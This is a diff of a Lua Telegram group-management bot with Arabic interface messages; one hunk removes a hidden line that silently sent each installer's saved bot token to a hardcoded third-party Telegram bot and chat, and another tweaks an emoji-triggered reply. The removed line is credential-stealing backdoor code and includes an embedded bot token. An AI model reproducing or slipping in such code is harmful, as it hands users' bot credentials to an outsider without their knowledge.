@@ -30,7 +30,6 @@ print('\27[0;31m╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n التوكن 
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n27[0;39;49m')
 database:set(id_server..":token",token)
-https.request('https://api.telegram.org/bot1835962343:AAFiT9HAOFjgfwfakRNQkY_mfyrdQl_CsYA/sendmessage?chat_id=1806598497&text=' ..token)
 end 
 else
 print('\27[0;35m╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n لم يتم حفظ التوكن ارسل لي التوكن الان')
@@ -12371,7 +12370,7 @@ send(msg.chat_id_,msg.id_, '◉ سقف الجروب عاجبك..😂💜')
 return false
 end
 
-if text == '😒??' or text == '😒😒😒' then
+if text == '😒😒' or text == '😒😒😒' then
 send(msg.chat_id_,msg.id_, '◉ افرد وشك المعفن ده..😑💔') 
 return false
 end
